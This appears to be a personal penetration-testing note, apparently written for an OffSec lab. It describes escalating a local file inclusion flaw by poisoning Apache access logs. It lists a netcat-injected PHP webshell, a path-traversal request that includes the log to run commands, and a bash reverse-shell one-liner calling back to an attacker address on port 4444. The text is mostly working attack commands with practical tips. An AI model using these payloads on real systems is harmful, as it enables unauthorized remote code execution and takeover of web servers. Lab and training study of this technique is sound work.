-- -
If you are able to read local files on the file system via the webapp, then see if you can read the apache logs:
```bash
/var/log/apache2/access.log
```
If you can, then you can put a webshell into it:
```bash
# connect to webapp via netcat
nc -nv <target ip> 80

# input webshell, this will be saved to the log
# note DO NOT MESS THIS UP. If you do then you will have closed the vector.
GET <?php system($_GET[‘cmd’]); ?> HTTP/1.1

# test it works
# remember, it's the & symbole NOT ?
http://<target host>/index.php?book=../../../../../../var/log/apache2/access.log&cmd=id

# should see the id command output
```
Then you can just try to get a reverse shell from there:
```bash
# may or may not need encoding
# note: I got it working with a python reverse shell
http://<target host>/index.php?book=../../../../../../var/log/apache2/access.log&cmd=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```
#### Resource
- [Walkthrough that helped me](https://medium.com/@bl4ck4non/solstice-offsec-labs-writeup-5606c806b253)